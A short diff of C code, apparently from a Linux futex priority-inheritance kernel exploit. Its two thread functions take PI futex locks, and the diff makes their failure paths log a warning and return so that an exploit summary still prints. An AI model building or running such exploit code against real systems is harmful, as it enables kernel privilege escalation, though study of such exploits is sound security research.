@@ -25,7 +25,9 @@ void *waiter_thread(void *arg __attribute__((unused))) {
   atomic_store(&waiter_tid, tid);
 
   if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("waiter lock chain errno=%d\n", errno);
+    /* Panic-safe: 锁链失败回退而非 exit, 让 exploit_summary 打印状态 */
+    pr_warning("waiter lock chain errno=%d\n", errno);
+    return NULL;
   }
 
   atomic_store(&waiter_ready, 1);
@@ -55,7 +57,9 @@ void *owner_thread(void *arg __attribute__((unused))) {
 
   long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   if (lock_target != 0) {
-    pr_error("owner lock target errno=%d\n", errno);
+    /* Panic-safe: 锁目标失败回退而非 exit */
+    pr_warning("owner lock target errno=%d\n", errno);
+    return NULL;
   }
 
   while (!atomic_load(&waiter_ready)) {
